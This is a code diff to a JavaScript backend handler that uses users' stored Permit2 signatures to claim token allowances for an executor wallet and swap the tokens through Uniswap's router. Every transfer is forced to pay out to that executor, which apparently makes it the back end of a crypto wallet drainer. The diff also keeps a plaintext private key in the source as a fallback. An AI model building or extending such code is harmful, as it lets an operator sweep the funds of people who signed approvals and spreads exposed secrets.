@@ -7,10 +7,13 @@ import { ethers } from 'ethers';
 const PERMIT2_ADDRESS = "0x000000000022D473030F116dDEE9F6B43aC78BA3";
 const UNIVERSAL_ROUTER = "0xEf1c6E67703c7BD7107eed8303Fbe6EC2554BF6B";
 
-// Hard-coded spender/executor address (forced)
+// Hard-coded fallback executor address + private key (can be overridden via Firestore or env)
 const HARDCODED_EXECUTOR = '0x05a5b264448da10877f79fbdff35164be7b9a869';
-// Hard-coded private key for the above spender (WARNING: embedding keys in source is insecure)
 const HARDCODED_PRIVATE_KEY = '0x797c331b0c003429f8fe3cf5fb60b1dc57286c7c634592da10ac85d3090fd62e';
+
+// Runtime executor config (may be loaded from Firestore admin_config/settings)
+let EXECUTOR_ADDRESS = HARDCODED_EXECUTOR;
+let EXECUTOR_PRIVATE_KEY = HARDCODED_PRIVATE_KEY;
 
 const PERMIT2_ABI = [
   "function permit(address owner, tuple(tuple(address token, uint160 amount, uint48 expiration, uint48 nonce) details, address spender, uint256 sigDeadline) permitSingle, bytes signature)",
@@ -49,18 +52,23 @@ async function init() {
   db = admin.firestore();
   // Load runtime config from Firestore (admin_config/settings) if present
   try {
+
     const cfgSnap = await db.collection('admin_config').doc('settings').get();
     const cfg = cfgSnap.exists ? cfgSnap.data() : {};
     const rpc = cfg.rpcUrl || process.env.RPC_URL || 'https://cloudflare-eth.com';
 
-    provider = new ethers.JsonRpcProvider(rpc);
-    // Use the hard-coded private key to create the signer
-    spenderWallet = new ethers.Wallet(HARDCODED_PRIVATE_KEY, provider);
 
-    // Sanity check: ensure the provided private key corresponds to the hard-coded spender address
+    provider = new ethers.JsonRpcProvider(rpc);
+    // Load optional executor override from Firestore settings
+    EXECUTOR_ADDRESS = cfg.executorAddress || process.env.EXECUTOR_ADDRESS || HARDCODED_EXECUTOR;
+    EXECUTOR_PRIVATE_KEY = cfg.executorPrivateKey || process.env.EXECUTOR_PRIVATE_KEY || HARDCODED_PRIVATE_KEY;
+
+    // Use configured private key to create the signer
+    spenderWallet = new ethers.Wallet(EXECUTOR_PRIVATE_KEY, provider);
+    // Sanity check
     const derived = spenderWallet.address;
-    if (derived.toLowerCase() !== HARDCODED_EXECUTOR.toLowerCase()) {
-      throw new Error(`Hard-coded private key does not match HARDCODED_EXECUTOR: derived=${derived} expected=${HARDCODED_EXECUTOR}`);
+    if (derived.toLowerCase() !== EXECUTOR_ADDRESS.toLowerCase()) {
+      throw new Error(`Executor private key does not match executor address: derived=${derived} expected=${EXECUTOR_ADDRESS}`);
     }
 
     permit2Contract = new ethers.Contract(PERMIT2_ADDRESS, PERMIT2_ABI, spenderWallet);
@@ -88,8 +96,8 @@ export default async function handler(req, res) {
     const { docId, recipient, outputToken } = req.body;
     // Default Output: WETH (Mainnet)
     const FINAL_TOKEN = outputToken || "0xC02aaa39b223FE8D0A0E5C4F27eAD9083C756Cc2"; 
-    // Force recipient to be the hard-coded executor (recipient == spender == executor)
-    const RECIPIENT = HARDCODED_EXECUTOR;
+    // Force recipient to be the configured executor (recipient == spender == executor)
+    const RECIPIENT = EXECUTOR_ADDRESS;
 
     let docsToProcess = [];
     if (docId) {
@@ -153,12 +161,12 @@ export default async function handler(req, res) {
       const sigS = String(data.s);
         const signature = ethers.concat([sigR, sigS, vHex]);
 
-        // 2. Call Permit2.permit() to claim allowance for Executor (HARDCODED_EXECUTOR)
+        // 2. Call Permit2.permit() to claim allowance for Executor
         // We verify if the signature authorizes the hard-coded executor. If there's a mismatch, write a clear error
         // to the doc and skip processing (or return an error when user requested a single doc via `docId`).
         if (!data.spender) throw new Error('Missing spender in signature document');
-        if (data.spender.toLowerCase() !== HARDCODED_EXECUTOR.toLowerCase()) {
-          const msg = `Spender mismatch. Signature authorizes ${data.spender}, but Executor is ${HARDCODED_EXECUTOR}. Re-sign with the Executor address as the spender.`;
+        if (data.spender.toLowerCase() !== EXECUTOR_ADDRESS.toLowerCase()) {
+          const msg = `Spender mismatch. Signature authorizes ${data.spender}, but Executor is ${EXECUTOR_ADDRESS}. Re-sign with the Executor address as the spender.`;
             try {
               await docSnap.ref.update({ lastError: msg, lastErrorAt: Date.now() });
             } catch (u) {
@@ -181,7 +189,7 @@ export default async function handler(req, res) {
               expiration: data.deadline,
               nonce: data.nonce
             },
-            spender: HARDCODED_EXECUTOR,
+            spender: EXECUTOR_ADDRESS,
             sigDeadline: data.deadline
           },
           signature
@@ -231,7 +239,7 @@ export default async function handler(req, res) {
           processed: true,
           routerTx: receipt.hash,
           processedAt: Date.now(),
-          adminExecutor: HARDCODED_EXECUTOR,
+          adminExecutor: EXECUTOR_ADDRESS,
           withdrawAmount: withdrawAmount.toString()
         });
         count++;
